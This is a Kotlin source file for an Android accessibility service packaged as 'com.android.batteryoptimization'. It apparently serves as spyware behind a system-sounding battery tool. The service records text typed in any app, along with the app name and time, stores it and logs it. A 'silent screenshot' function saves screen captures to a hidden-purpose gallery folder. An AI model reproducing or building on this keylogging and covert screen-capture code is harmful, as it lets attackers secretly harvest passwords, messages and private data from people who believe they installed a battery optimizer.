package com.android.batteryoptimization

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class InputAccessibilityService : AccessibilityService() {

    private lateinit var repository: InputRepository

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        repository = InputRepository.getInstance(applicationContext)
        Log.d(TAG, "Accessibility Service Connected")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val packageName = event.packageName?.toString() ?: "Unknown"
            val appName = getAppName(packageName)
            val text = event.text.joinToString(" ")
            
            // Avoid capturing empty or blank strings unnecessarily
            if (text.isNotBlank()) {
                val inputEvent = InputEvent(
                    timestamp = System.currentTimeMillis(),
                    packageName = packageName,
                    appName = appName,
                    text = text
                )
                repository.addEvent(inputEvent)
                Log.d(TAG, "Captured input: $text from $packageName")
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility Service Interrupted")
    }

    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val applicationInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(applicationInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    fun takeSilentScreenshot(context: android.content.Context, onResult: (Boolean, String) -> Unit) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                context.mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshot: ScreenshotResult) {
                        try {
                            val hardwareBuffer = screenshot.hardwareBuffer
                            val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshot.colorSpace)
                            if (bitmap != null) {
                                val success = saveBitmapToGallery(context, bitmap)
                                if (success) {
                                    onResult(true, "截屏成功，已保存至相册")
                                } else {
                                    onResult(false, "截屏保存相册失败")
                                }
                            } else {
                                onResult(false, "截屏转换Bitmap失败")
                            }
                            hardwareBuffer.close()
                        } catch (e: Exception) {
                            Log.e(TAG, "Screenshot handling error", e)
                            onResult(false, "截屏处理异常: ${e.message}")
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        onResult(false, "截屏失败，错误码: $errorCode")
                    }
                }
            )
        } else {
            onResult(false, "系统版本过低，静默截屏需要 Android 11 (API 30) 及以上")
        }
    }

    private fun saveBitmapToGallery(context: android.content.Context, bitmap: android.graphics.Bitmap): Boolean {
        // TODO 后期如需保存在 data/data/包名 沙盒存储，可切换使用以下代码：
        // val file = java.io.File(context.filesDir, "screenshot_${System.currentTimeMillis()}.png")
        // file.outputStream().use { bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, it) }
        // return true

        val filename = "screenshot_${System.currentTimeMillis()}.png"
        val contentValues = android.content.ContentValues().apply {
            put(android.provider.MediaStore.MediaColumns.DISPLAY_NAME, filename)
            put(android.provider.MediaStore.MediaColumns.MIME_TYPE, "image/png")
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                put(android.provider.MediaStore.MediaColumns.RELATIVE_PATH, android.os.Environment.DIRECTORY_PICTURES + "/BatteryOptimization")
                put(android.provider.MediaStore.MediaColumns.IS_PENDING, 1)
            }
        }

        val resolver = context.contentResolver
        val uri = resolver.insert(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues)
        return if (uri != null) {
            try {
                resolver.openOutputStream(uri)?.use { outputStream ->
                    bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, outputStream)
                }
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                    contentValues.clear()
                    contentValues.put(android.provider.MediaStore.MediaColumns.IS_PENDING, 0)
                    resolver.update(uri, contentValues, null, null)
                }
                true
            } catch (e: Exception) {
                Log.e(TAG, "Failed to save screenshot to gallery", e)
                false
            }
        } else {
            false
        }
    }

    companion object {
        private const val TAG = "InputAccessibility"
        var instance: InputAccessibilityService? = null
            private set
    }
}
